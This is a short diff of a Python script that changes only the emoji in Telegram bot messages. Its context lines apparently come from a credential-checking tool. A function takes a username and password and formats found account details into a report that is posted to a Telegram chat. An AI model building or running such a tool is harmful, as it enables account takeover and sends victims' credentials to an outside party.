@@ -121,7 +121,7 @@ t = time.localtime()
 current_time = time.strftime("%H:%M:%S", t)
 print('  ') 
 sleep(2)
-start_msg = requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=⌯ ⚡️GOOD TOOL NEW DUCK😊😋").json()
+start_msg = requests.post(f"https://api.telegram.org/bot{tok}/sendMessage?chat_id={ID}&text=⌯ ⚡️GOOD TOOL NEW DUCK🐥").json()
 id_msg	=(start_msg['result']["message_id"])
 def code_mrko(userQ,password):
 	cookie = secrets.token_hex(8)*2
@@ -152,9 +152,9 @@ def code_mrko(userQ,password):
 	dat = ree['data']
 	shug = (f"""
 
-Hi,DUCK⚡️
+Hi,DUCK⚡️🐥
   
-  GOOD NEW 🧸
+  GOOD NEW 🦢
 ====================
 ⌯ 𝐧𝐚𝐦𝐞 : {name}
 ⌯ 𝐮𝐬𝐞𝐫 : {userQ}
